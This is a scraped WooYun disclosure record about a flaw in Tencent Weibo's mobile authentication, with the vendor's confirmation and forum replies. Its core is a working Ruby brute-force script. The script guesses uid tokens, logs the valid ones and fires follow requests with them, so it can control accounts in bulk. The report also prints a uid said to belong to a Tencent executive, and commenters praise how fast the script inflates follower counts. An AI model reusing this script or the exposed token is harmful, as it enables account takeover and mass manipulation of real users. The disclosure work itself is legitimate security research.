{"id": 10916, "wybug_id": "wooyun-2013-026488", "wybug_title": "腾讯微博-移动端认证机制缺陷导致可批量控制微博-开荒篇", "wybug_corp": "腾讯", "wybug_author": "╰╃清風", "wybug_date": "2013-06-21 15:50", "wybug_open_date": "2013-08-05 15:50", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["恶意账户控制"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-05：\t细节向公众公开  简要描述：  3g版腾讯微博服务端某接口控制不严导致可批量控制微博，通过对接口截包分析最后写了本次的批量利用脚本。令附：控制腾讯某高管收听任何人 详细说明：   首先在讲之前先来看看 WooYun: 微信-腾讯微博认证机制存在严重缺陷 可直接控制他人微博 黑哥提供的方法，uid在goole和百度搜索到的结果很少，达不到我想要的批量的效果，那么我就只能自己开荒了，uid是否可以通过伪造或破解得到呢？经过多次的参数加密组合发现破解这条路走不通，就只能伪造了-----花了不少时间先来看下url：http://m.3g.qq.com/account.html?uid=xxx1&fr=2&aid=xxuid为32位不知道什么方式的加密，查看规律得到均由字母a-z+0-9组成，aid为自己微博名称（刷自己听众，留自己昵称），fr为随机操作标示一般为4位随机数字。知道规律后就可以用ruby写下我们的程序了。当ruby批量构造uid请求时，需要对服务端返回的信息进行筛选，获取对我们有用的正确的uid并用log保存在本地，过滤出200ok的返回结果并且抓取页面有“收听”2字的url保存到log中再访问得到url可以看到又上角收听功能  ok，现在点下看看，发现自己听众+1了\n\n 接着就是利用GET请求自动操作来达到自动收听的效果，现在来看看收听的get请求URL：http://m.3g.qq.com/cgi-bin/general.cgi?uid=#{uid}&sid=&fr=2&ft=0&aid=#{aid}&cgi=follow&stid=#{stid}  ft=0则为收听，ft=1则为取消收听，下面就可以完成我们的代码了：\n# encoding: utf-8require \"rubygems\"require 'net/http'require 'open-uri'def makefile(file,string)  directory = \"#{Dir.pwd}\"  FileUtils.mkdir(directory)  unless File.directory?(directory)  f = File.open(\"#{directory}/#{file}\",\"a\")  f.puts string  f.closeend  def get_url(url)\turl = URI.parse(url)\thttp      = Net::HTTP.new(url.host, url.port)\tresp      = http.get(url)\tendthreads=[]    12.times {    threads << Thread.new{\t10000000.times { |x|\t\t#puts x\t\taid  = 'i0_0i-hu' \t\tarr  = (0..9).to_a+('a'..'z').to_a\t\tuid  = arr.sample(32).join(\"\")\t\tstid = arr.sample(3).join(\"\")\t\turl = \"http://m.3g.qq.com/account.html?uid=#{uid}&fr=2&aid=#{aid}\"\t\tresp = get_url(url)\t\t#puts resp.code\t\tresponse = resp.body.force_encoding('UTF-8')\t\tif response =~ />收听<\\/a>/\t\t  puts url\t\t  makefile(\"log.txt\",url)\t\t  send_url=\"http://m.3g.qq.com/cgi-bin/general.cgi?uid=#{uid}&sid=&fr=2&ft=0&aid=#{aid}&cgi=follow&stid=#{stid}\"\t\t  get_url(send_url)\t\tend \t\t}\t\t}}  threads.each{|t| t.join}\n至此，批量刷收听程序就完成了。ps：腾讯某高管的uid 可控制其收听任何人\n\n例如：http://m.3g.qq.com/account.html?uid=57a27298fc466eacdd2524e8b59a3b11&fr=2&aid=被收听人这个可不仅仅能刷粉哦！   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  null   版权声明：转载请注明来源 ╰╃清風@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-06-21 17:51 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案，如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-21 16:05 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  雷劈了！    \n     2013-06-21 16:05 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  这是壹万的节奏~    \n     2013-06-21 16:06 |    \t\t1ee \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:14        | 看书中....)\t\t \n  楼主要连载、果断mark    \n     2013-06-21 16:08 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  腾讯业务线太长 洞主这是为难腾讯的程序员啊    \n     2013-06-21 16:10 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  令附：控制腾讯某高管收听任何人亮了！！麻花？    \n     2013-06-21 16:11 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  关联这个  WooYun: 微信-腾讯微博认证机制存在严重缺陷 可直接控制他人微博 ?    \n     2013-06-21 16:54 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  sid那个利用??    \n     2013-06-21 17:44 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  连载？    \n     2013-06-21 17:45 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  占地啦~~    \n     2013-06-21 19:04 |    \t\tBlackWidow7 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:28        | 屌丝~)\t\t \n  跪求~    \n     2013-06-21 20:57 |    \t\t点点 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:38        | 准备申请سمَـَّوُوُحخ ̷̴̐...)\t\t \n  好厉害    \n     2013-06-21 21:11 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  好厉害的样子哦。    \n     2013-06-21 22:52 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @猪猪侠 黑哥，其实就是你那个漏洞，只不过你没写出详细漏洞利用方法，腾讯就想不了了之了。    \n     2013-06-21 23:37 |    \t\t╰╃清風 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:9        | 这家伙很懒，什么都没有留下)\t\t \n  @猪猪侠 黑哥,这个是真暴力    \n     2013-06-22 08:29 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  马克    \n     2013-07-13 00:31 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  @╰╃清風 膜拜洞主， 32位uid是咋猜的， 暴力？    \n     2013-07-21 18:02 |    \t\t小智 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:5        | 低调低调，学习学习~)\t\t \n  @fox 貌似真的是靠伪造，靠猜-。-这个成功率高不高    \n     2013-07-21 23:48 |    \t\t紫林 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:4        | 喜欢白帽子)\t\t \n  求全部代码！    \n     2013-08-05 16:47 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @Finger 这个暴力有点难啊 代码又没给    \n     2013-08-05 16:52 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @紫林 @小胖胖要减肥 上面不是给代码了么 爆破不难 腾讯用户基数大 几个小时就能刷上万粉    \n     2013-08-05 19:43 |    \t\t紫林 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:4        | 喜欢白帽子)\t\t \n  @Finger 现在还可以？ 我菜鸟 呵呵     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}